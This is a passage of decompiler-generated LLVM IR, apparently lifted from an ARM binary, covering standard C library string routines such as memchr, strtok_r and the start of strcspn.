  %v5_1a890 = and i32 %v4_1a890, %v0_1a890
  %v6_1a890 = icmp slt i32 %v5_1a890, 0
  %v7_1a890 = icmp slt i32 %v2_1a890, 0
  store i1 %v6_1a890, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1a890, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a898

dec_label_pc_1a898:                               ; preds = %dec_label_pc_1a898.loopexit, %dec_label_pc_1a874
  %v2_1a70452 = phi i32 [ %v5_1a88c, %dec_label_pc_1a898.loopexit ], [ %v1_1a868, %dec_label_pc_1a874 ]
  %v0_1a6f448 = phi i32 [ %v2_1a890, %dec_label_pc_1a898.loopexit ], [ %v2_1a878, %dec_label_pc_1a874 ]
  %v0_1a898 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a898 = add i32 %v0_1a898, 1
  store i32 %v1_1a898, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1a88c, { 0, 2, 1 }
  uselistorder i32 %v3_1a880, { 1, 0 }
  uselistorder i32 %v2_1a878, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a868, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a848, { 1, 0 }
  uselistorder i32 %v3_1a844, { 1, 0 }
  uselistorder i32 %v0_1a848, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a868, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1a820, { 0, 2, 1 }
  uselistorder i32 %v3_1a814, { 1, 0 }
  uselistorder i32 %v2_1a80c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a7fc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a7dc, { 1, 0 }
  uselistorder i32 %v3_1a7d8, { 1, 0 }
  uselistorder i32 %v0_1a7dc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a7fc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_1a7b4, { 0, 2, 1 }
  uselistorder i32 %v3_1a7a8, { 1, 0 }
  uselistorder i32 %v2_1a7a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a790, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1a770, { 1, 0 }
  uselistorder i32 %v3_1a76c, { 1, 0 }
  uselistorder i32 %v0_1a770, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a790, { 3, 2, 1, 0 }
  uselistorder i1 %v5_1a838, { 2, 0, 1 }
  uselistorder i32 %v0_1a750, { 1, 0 }
  uselistorder i32 %v0_1a83c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1a79018, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_1a740, { 2, 1, 0 }
  uselistorder i32 %v0_1a740, { 2, 0, 1 }
  uselistorder i32 %v2_1a738, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_1a738, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1a738, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1a79019, { 2, 1, 0 }
  uselistorder i32 %v11_1a714, { 1, 0 }
  uselistorder i32 %v7_1a714, { 1, 0 }
  uselistorder i32 %v1_1a6f4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1a6f4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1a6f8, { 1, 0 }
  uselistorder i32 %v7_1a6ec, { 0, 2, 1 }
  uselistorder i32 %v10_1a6e8, { 1, 0 }
  uselistorder i32 %v9_1a6e0, { 1, 0, 2 }
  uselistorder i32 %v6_1a6dc, { 1, 0 }
  uselistorder i32 %v2_1a6d4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1a6d4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1a6e4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1a6c8, { 0, 2, 1 }
  uselistorder i32 %v13_1a6c4, { 1, 0 }
  uselistorder i32 %v4_1a6c0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_1a6c0, { 2, 0, 1 }
  uselistorder i32 %v6_1a6c8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_1a6b8, { 0, 2, 1 }
  uselistorder i32 %v16_1a6b4, { 1, 0 }
  uselistorder i32 %v4_1a6b0, { 1, 2, 0 }
  uselistorder i32 %v0_1a6c0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_1a6b8, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1a6a4, { 0, 3, 2, 1 }
  uselistorder i32 %v10_1a6a0, { 1, 0 }
  uselistorder i32 %v1_1a69c, { 1, 0 }
  uselistorder i32 %v10_1a698, { 1, 0 }
  uselistorder i32 %v0_1a698, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a69c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_1a690, { 0, 2, 1 }
  uselistorder i32 %v2_1a684, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_1a684, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1a69c36, { 1, 2, 0 }
  uselistorder i32 %v1_1a67c, { 2, 1, 0 }
  uselistorder i32 %v1_1a674, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1a66c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_1a668, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_1a664, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_1a664, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_1a654, { 0, 2, 1 }
  uselistorder i32 %v4_1a650, { 1, 0 }
  uselistorder i32 %v3_1a644, { 1, 0 }
  uselistorder i32 %v1_1a63c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a630, { 1, 0 }
  uselistorder i32 %v12_1a62c, { 0, 2, 1 }
  uselistorder i32 %v8_1a60c, { 1, 0, 2 }
  uselistorder i32 %v5_1a60c, { 1, 0, 2 }
  uselistorder i32 %v2_1a60c, { 1, 0, 2 }
  uselistorder i32 %v0_1a60c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a62c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a5e8, { 0, 2, 1 }
  uselistorder i32 %v4_1a5e4, { 1, 0 }
  uselistorder i32 %v3_1a5d8, { 1, 0 }
  uselistorder i32 %v1_1a5d0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a5c4, { 1, 0 }
  uselistorder i32 %v12_1a5c0, { 0, 2, 1 }
  uselistorder i32 %v8_1a5a0, { 1, 0, 2 }
  uselistorder i32 %v5_1a5a0, { 1, 0, 2 }
  uselistorder i32 %v2_1a5a0, { 1, 0, 2 }
  uselistorder i32 %v0_1a5a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a5c0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a57c, { 0, 2, 1 }
  uselistorder i32 %v4_1a578, { 1, 0 }
  uselistorder i32 %v3_1a56c, { 1, 0 }
  uselistorder i32 %v1_1a564, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a558, { 1, 0 }
  uselistorder i32 %v12_1a554, { 0, 2, 1 }
  uselistorder i32 %v8_1a534, { 1, 0, 2 }
  uselistorder i32 %v5_1a534, { 1, 0, 2 }
  uselistorder i32 %v2_1a534, { 1, 0, 2 }
  uselistorder i32 %v0_1a534, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a554, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_1a590, { 0, 2, 1 }
  uselistorder i32 %v1_1a58c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1a510, { 2, 0, 1, 3 }
  uselistorder i32 %v2_1a510, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a594, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1a62c75, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_1a504, { 1, 0 }
  uselistorder i32 %v0_1a504, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1a4fc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1a4fc, { 1, 0, 2 }
  uselistorder i32 %v0_1a4fc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1a62c76, { 1, 0 }
  uselistorder i32 %v1_1a4dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_1a4e4, { 1, 0 }
  uselistorder i32 %v0_1a4b8, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1a4ac, { 1, 2, 0, 3 }
  uselistorder i32 %v5_1a498, { 1, 0, 2 }
  uselistorder i32 %v1_1a494, { 1, 0 }
  uselistorder i32 %v1_1a48c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1a48c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a484, { 0, 2, 1 }
  uselistorder i32 %v3_1a484, { 3, 0, 1, 2 }
  uselistorder i1 %v0_1a484, { 1, 0 }
  uselistorder i1 %v1_1a484, { 1, 0 }
  uselistorder i32 %v3_1a480, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_1a478, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1a464, { 1, 2, 0 }
  uselistorder i32 %v1_1a45c, { 0, 2, 1 }
  uselistorder i32 %v12_1a458, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1a44c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1a450, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_1a440, { 0, 2, 1 }
  uselistorder i32 %v1_1a438, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1a438, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_1a430, { 1, 0 }
  uselistorder i32 %v1_1a428, { 2, 1, 0 }
  uselistorder i32 %v2_1a420, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1a420, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_1a41c, { 1, 0 }
  uselistorder i32 %v2_1a410, { 1, 0 }
  uselistorder i32 %v1_1a410, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_1a410, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 0, 49, 1, 2, 3, 4, 5, 50, 6, 7, 8, 9, 10, 51, 11, 12, 38, 39, 40, 52, 13, 15, 14, 16, 17, 18, 41, 42, 43, 45, 44, 46, 47, 48, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 19, 36, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 52, 4, 6, 8, 10, 7, 53, 9, 11, 13, 50, 12, 54, 49, 51, 55, 57, 56, 58, 59, 14, 15, 16, 18, 17, 19, 20, 65, 21, 22, 66, 23, 67, 60, 68, 61, 62, 63, 64, 69, 71, 74, 70, 73, 72, 75, 77, 80, 76, 79, 78, 81, 84, 87, 82, 86, 85, 88, 24, 25, 30, 26, 28, 27, 29, 31, 34, 32, 35, 33, 36, 37, 83, 38, 39, 43, 40, 44, 41, 45, 42, 46, 47, 48, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 45, 3, 4, 46, 5, 6, 47, 7, 39, 40, 41, 8, 9, 48, 10, 12, 11, 13, 14, 49, 15, 16, 50, 17, 42, 43, 44, 51, 52, 53, 54, 55, 56, 57, 58, 61, 62, 18, 20, 19, 21, 22, 24, 23, 25, 26, 28, 27, 29, 30, 59, 60, 31, 32, 33, 36, 34, 35, 37, 38, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 17, 18, 19, 6, 7, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 32, 31, 33, 34, 36, 35, 37, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 6, 7, 8, 9, 10, 11, 12, 13, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 35, 36, 11, 12, 13, 14, 15, 16, 37, 38, 2, 39, 40, 41, 42, 43, 1, 44, 6, 45, 0, 47, 46, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 35, 11, 12, 13, 14, 15, 16, 17, 36, 37, 2, 38, 39, 40, 1, 41, 6, 42, 0, 44, 43, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 7, 4, 9, 5, 10, 8, 38, 39, 11, 12, 13, 14, 15, 16, 17, 40, 41, 2, 42, 43, 44, 45, 46, 1, 47, 6, 48, 0, 50, 49, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1a880, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a814, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a7a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a748, { 1, 0 }
  uselistorder label %.thread13, { 2, 0, 1 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %bb150, { 4, 5, 6, 2, 7, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a6d4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_1a698, { 1, 0 }
  uselistorder label %dec_label_pc_1a684, { 1, 0 }
  uselistorder label %dec_label_pc_1a644, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a5d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a56c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a50c, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %dec_label_pc_1a4dc, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %bb140, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread114, { 1, 0 }
  uselistorder label %dec_label_pc_1a478, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %dec_label_pc_1a438, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1a8a4 = urem i32 %arg1, 256
  %v0_1a8c0.pr = load i32, i32* @r2, align 4
  %v2_1a8c015 = icmp eq i32 %v0_1a8c0.pr, 0
  %v0_1a8d4.pre = load i32, i32* @r0, align 4
  br i1 %v2_1a8c015, label %dec_label_pc_1a8d0, label %dec_label_pc_1a8c8

dec_label_pc_1a8ac:                               ; preds = %dec_label_pc_1a8c8
  %v1_1a8ac = inttoptr i32 %v0_1a8bc to i8*
  %v2_1a8ac = load i8, i8* %v1_1a8ac, align 1
  %v3_1a8ac = zext i8 %v2_1a8ac to i32
  %v9_1a8b0 = icmp eq i32 %v3_1a8ac, %v1_1a8a4
  br i1 %v9_1a8b0, label %dec_label_pc_1a980, label %dec_label_pc_1a8b8

dec_label_pc_1a8b8:                               ; preds = %dec_label_pc_1a8ac
  %v1_1a8b8 = add i32 %v0_1a8b8, -1
  %v1_1a8bc = add i32 %v0_1a8bc, 1
  %v2_1a8c0 = icmp eq i32 %v1_1a8b8, 0
  br i1 %v2_1a8c0, label %dec_label_pc_1a8d0, label %dec_label_pc_1a8c8

dec_label_pc_1a8c8:                               ; preds = %entry, %dec_label_pc_1a8b8
  %v0_1a8b8 = phi i32 [ %v1_1a8b8, %dec_label_pc_1a8b8 ], [ %v0_1a8c0.pr, %entry ]
  %v0_1a8bc = phi i32 [ %v1_1a8bc, %dec_label_pc_1a8b8 ], [ %v0_1a8d4.pre, %entry ]
  %v1_1a8c8 = urem i32 %v0_1a8bc, 4
  %v2_1a8c8 = icmp eq i32 %v1_1a8c8, 0
  br i1 %v2_1a8c8, label %dec_label_pc_1a8d0, label %dec_label_pc_1a8ac

dec_label_pc_1a8d0:                               ; preds = %dec_label_pc_1a8b8, %dec_label_pc_1a8c8, %entry
  %v0_1a94c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_1a8b8 ], [ %v0_1a8b8, %dec_label_pc_1a8c8 ]
  %v0_1a8d4 = phi i32 [ %v0_1a8d4.pre, %entry ], [ %v1_1a8bc, %dec_label_pc_1a8b8 ], [ %v0_1a8bc, %dec_label_pc_1a8c8 ]
  %v4_1a8d0 = mul nuw nsw i32 %v1_1a8a4, 256
  %v5_1a8d0 = or i32 %v4_1a8d0, %v1_1a8a4
  %v4_1a8d8 = mul i32 %v5_1a8d0, 65536
  %v5_1a8d8 = or i32 %v4_1a8d8, %v5_1a8d0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_1a94c22, 3
  br i1 %tmp, label %dec_label_pc_1a8e0, label %dec_label_pc_1a974.preheader

dec_label_pc_1a8e0:                               ; preds = %dec_label_pc_1a8d0, %dec_label_pc_1a94c.backedge
  %v0_1a8fc60 = phi i32 [ %v1_1a8fc, %dec_label_pc_1a94c.backedge ], [ %v0_1a94c22, %dec_label_pc_1a8d0 ]
  %v0_1a92059 = phi i32 [ %v4_1a8e0, %dec_label_pc_1a94c.backedge ], [ %v0_1a8d4, %dec_label_pc_1a8d0 ]
  %v1_1a8e0 = inttoptr i32 %v0_1a92059 to i32*
  %v2_1a8e0 = load i32, i32* %v1_1a8e0, align 4
  %v4_1a8e0 = add i32 %v0_1a92059, 4
  %v2_1a8e4 = xor i32 %v2_1a8e0, %v5_1a8d8
  %v2_1a8e8 = add i32 %v2_1a8e4, 2130640639
  %v1_1a8ec = sub i32 -1, %v2_1a8e4
  %v2_1a8f0 = xor i32 %v2_1a8e8, %v1_1a8ec
  %v2_1a8f4 = and i32 %v2_1a8f0, -2130640640
  %v2_1a8f8 = icmp eq i32 %v2_1a8f4, 0
  %v1_1a8fc = add i32 %v0_1a8fc60, -4
  br i1 %v2_1a8f8, label %dec_label_pc_1a94c.backedge, label %dec_label_pc_1a904

dec_label_pc_1a94c.backedge:                      ; preds = %dec_label_pc_1a8e0, %dec_label_pc_1a93c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_1a8fc, 3
  br i1 %tmp73, label %dec_label_pc_1a8e0, label %dec_label_pc_1a974.preheader

dec_label_pc_1a904:                               ; preds = %dec_label_pc_1a8e0
  %v2_1a904 = inttoptr i32 %v0_1a92059 to i8*
  %v3_1a904 = load i8, i8* %v2_1a904, align 1
  %v4_1a904 = zext i8 %v3_1a904 to i32
  %v9_1a90c = icmp eq i32 %v4_1a904, %v1_1a8a4
  %v1_1a910 = add i32 %v0_1a92059, 3
  store i32 %v1_1a910, i32* @ip, align 4
  br i1 %v9_1a90c, label %dec_label_pc_1a980, label %dec_label_pc_1a918

dec_label_pc_1a918:                               ; preds = %dec_label_pc_1a904
  %v1_1a918 = add i32 %v0_1a92059, 1
  %v2_1a918 = inttoptr i32 %v1_1a918 to i8*
  %v3_1a918 = load i8, i8* %v2_1a918, align 1
  %v4_1a918 = zext i8 %v3_1a918 to i32
  %v9_1a91c = icmp eq i32 %v4_1a918, %v1_1a8a4
  br i1 %v9_1a91c, label %bb, label %dec_label_pc_1a92c

bb:                                               ; preds = %dec_label_pc_1a918
  br label %dec_label_pc_1a980

dec_label_pc_1a92c:                               ; preds = %dec_label_pc_1a918
  %v1_1a92c = add i32 %v0_1a92059, 2
  %v2_1a92c = inttoptr i32 %v1_1a92c to i8*
  %v3_1a92c = load i8, i8* %v2_1a92c, align 1
  %v4_1a92c = zext i8 %v3_1a92c to i32
  %v9_1a930 = icmp eq i32 %v4_1a92c, %v1_1a8a4
  br i1 %v9_1a930, label %dec_label_pc_1a980, label %dec_label_pc_1a93c

dec_label_pc_1a93c:                               ; preds = %dec_label_pc_1a92c
  %v2_1a93c = inttoptr i32 %v1_1a910 to i8*
  %v3_1a93c = load i8, i8* %v2_1a93c, align 1
  %v4_1a93c = zext i8 %v3_1a93c to i32
  %v9_1a940 = icmp eq i32 %v4_1a93c, %v1_1a8a4
  br i1 %v9_1a940, label %bb36, label %dec_label_pc_1a94c.backedge

bb36:                                             ; preds = %dec_label_pc_1a93c
  br label %dec_label_pc_1a980

dec_label_pc_1a974.preheader:                     ; preds = %dec_label_pc_1a94c.backedge, %dec_label_pc_1a8d0
  %v0_1a920.lcssa = phi i32 [ %v0_1a8d4, %dec_label_pc_1a8d0 ], [ %v4_1a8e0, %dec_label_pc_1a94c.backedge ]
  %v0_1a8fc.lcssa = phi i32 [ %v0_1a94c22, %dec_label_pc_1a8d0 ], [ %v1_1a8fc, %dec_label_pc_1a94c.backedge ]
  %v2_1a9747 = icmp eq i32 %v0_1a8fc.lcssa, 0
  br i1 %v2_1a9747, label %dec_label_pc_1a97c, label %dec_label_pc_1a964

dec_label_pc_1a964:                               ; preds = %dec_label_pc_1a970, %dec_label_pc_1a974.preheader
  %v0_1a974.in = phi i32 [ %v0_1a974, %dec_label_pc_1a970 ], [ %v0_1a8fc.lcssa, %dec_label_pc_1a974.preheader ]
  %v0_1a970 = phi i32 [ %v1_1a970, %dec_label_pc_1a970 ], [ %v0_1a920.lcssa, %dec_label_pc_1a974.preheader ]
  %v0_1a974 = add i32 %v0_1a974.in, -1
  %v1_1a964 = inttoptr i32 %v0_1a970 to i8*
  %v2_1a964 = load i8, i8* %v1_1a964, align 1
  %v3_1a964 = zext i8 %v2_1a964 to i32
  %v9_1a968 = icmp eq i32 %v3_1a964, %v1_1a8a4
  br i1 %v9_1a968, label %dec_label_pc_1a980, label %dec_label_pc_1a970

dec_label_pc_1a970:                               ; preds = %dec_label_pc_1a964
  %v1_1a970 = add i32 %v0_1a970, 1
  %v2_1a974 = icmp eq i32 %v0_1a974, 0
  br i1 %v2_1a974, label %dec_label_pc_1a97c, label %dec_label_pc_1a964

dec_label_pc_1a97c:                               ; preds = %dec_label_pc_1a970, %dec_label_pc_1a974.preheader
  br label %dec_label_pc_1a980

dec_label_pc_1a980:                               ; preds = %dec_label_pc_1a8ac, %dec_label_pc_1a92c, %dec_label_pc_1a904, %dec_label_pc_1a964, %bb36, %bb, %dec_label_pc_1a97c
  %v1_1a984 = phi i32 [ 0, %dec_label_pc_1a97c ], [ %v1_1a918, %bb ], [ %v1_1a910, %bb36 ], [ %v0_1a970, %dec_label_pc_1a964 ], [ %v1_1a92c, %dec_label_pc_1a92c ], [ %v0_1a92059, %dec_label_pc_1a904 ], [ %v0_1a8bc, %dec_label_pc_1a8ac ]
  ret i32 %v1_1a984

; uselistorder directives
  uselistorder i32 %v1_1a8fc, { 1, 0, 2 }
  uselistorder i32 %v0_1a92059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_1a8d0, { 1, 0 }
  uselistorder i32 %v0_1a94c22, { 1, 2, 0 }
  uselistorder i32 %v0_1a8bc, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_1a8d4.pre, { 1, 0 }
  uselistorder i32 %v1_1a8a4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_1a980, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_1a94c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1a8e0, { 1, 0 }
  uselistorder label %dec_label_pc_1a8d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1a8c8, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1a990 = load i32, i32* @r4, align 4
  store i32 %v3_1a990, i32* %stack_var_-16, align 4
  %v0_1a994 = load i32, i32* @r0, align 4
  store i32 %v0_1a994, i32* %r4.global-to-local, align 4
  %v2_1a994 = icmp eq i32 %v0_1a994, 0
  %v1_1a998 = load i32, i32* @r2, align 4
  br i1 %v2_1a994, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_1a998 = inttoptr i32 %v1_1a998 to i32*
  %v3_1a998 = load i32, i32* %v2_1a998, align 4
  store i32 %v3_1a998, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_1a99c = phi i32 [ %v3_1a998, %bb ], [ %v0_1a994, %entry ]
  store i32 %v0_1a99c, i32* @r0, align 4
  store i32 %v1_1a998, i32* %r5.global-to-local, align 4
  %v0_1a9a4 = load i32, i32* @r1, align 4
  store i32 %v0_1a9a4, i32* %r6.global-to-local, align 4
  %v1_1a9a8 = inttoptr i32 %v0_1a99c to i8*
  %v2_1a9a8 = call i32 @__GI_strspn(i8* %v1_1a9a8)
  %v0_1a9ac = load i32, i32* %r4.global-to-local, align 4
  %v2_1a9ac = add i32 %v0_1a9ac, %v2_1a9a8
  %v3_1a9ac = inttoptr i32 %v2_1a9ac to i8*
  %v4_1a9ac = load i8, i8* %v3_1a9ac, align 1
  %v6_1a9ac = zext i8 %v4_1a9ac to i32
  store i32 %v6_1a9ac, i32* %r3.global-to-local, align 4
  store i32 %v2_1a9ac, i32* @r4, align 4
  %v2_1a9b4 = icmp eq i8 %v4_1a9ac, 0
  br i1 %v2_1a9b4, label %bb8, label %dec_label_pc_1a9c0

bb8:                                              ; preds = %entry._crit_edge
  %v2_1a9b8 = load i32, i32* %r5.global-to-local, align 4
  %v3_1a9b8 = inttoptr i32 %v2_1a9b8 to i32*
  store i32 %v2_1a9ac, i32* %v3_1a9b8, align 4
  br label %dec_label_pc_1a9fc

dec_label_pc_1a9c0:                               ; preds = %entry._crit_edge
  %v0_1a9c0 = load i32, i32* %r6.global-to-local, align 4
  %v3_1a9c8 = call i32 @__GI_strpbrk(i8* %v3_1a9ac, i32 %v0_1a9c0)
  %v3_1a9cc = icmp eq i32 %v3_1a9c8, 0
  br i1 %v3_1a9cc, label %dec_label_pc_1a9d4, label %dec_label_pc_1a9ec

dec_label_pc_1a9d4:                               ; preds = %dec_label_pc_1a9c0
  %v0_1a9d8 = load i32, i32* @r4, align 4
  store i32 %v0_1a9d8, i32* @r0, align 4
  %v2_1a9dc = call i32 @rawmemchr(i32 %v0_1a9d8, i32 0)
  %v0_1a9e0 = load i32, i32* @r4, align 4
  store i32 %v0_1a9e0, i32* %r3.global-to-local, align 4
  %v1_1a9e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a9e4 = inttoptr i32 %v1_1a9e4 to i32*
  store i32 %v2_1a9dc, i32* %v2_1a9e4, align 4
  br label %dec_label_pc_1a9fc

dec_label_pc_1a9ec:                               ; preds = %dec_label_pc_1a9c0
  %v4_1a9c8 = inttoptr i32 %v3_1a9c8 to i8*
  store i8 0, i8* %v4_1a9c8, align 1
  %v7_1a9f0 = add i32 %v3_1a9c8, 1
  %v1_1a9f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_1a9f4 = inttoptr i32 %v1_1a9f4 to i32*
  store i32 %v7_1a9f0, i32* %v2_1a9f4, align 4
  %v0_1a9f8 = load i32, i32* @r4, align 4
  store i32 %v0_1a9f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a9fc

dec_label_pc_1a9fc:                               ; preds = %bb8, %dec_label_pc_1a9d4, %dec_label_pc_1a9ec
  %v0_1a9fc = load i32, i32* %r3.global-to-local, align 4
  %v2_1aa00 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1aa00, i32* @r4, align 4
  ret i32 %v0_1a9fc

; uselistorder directives
  uselistorder i32 %v3_1a9c8, { 0, 2, 1 }
  uselistorder i32 %v0_1a99c, { 1, 0 }
  uselistorder i32 %v0_1a994, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1a9fc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_1aa08 = load i32, i32* @r4, align 4
  store i32 %v3_1aa08, i32* %stack_var_-16, align 4
  %v6_1aa08 = load i32, i32* @r5, align 4
  %v9_1aa08 = load i32, i32* @r6, align 4
  %v0_1aa0c = load i32, i32* @r0, align 4
  %v0_1aa10 = load i32, i32* @r1, align 4
  store i32 %v0_1aa10, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_1aa2c8 = inttoptr i32 %v0_1aa0c to i8*
  %v2_1aa2c9 = load i8, i8* %v1_1aa2c8, align 1
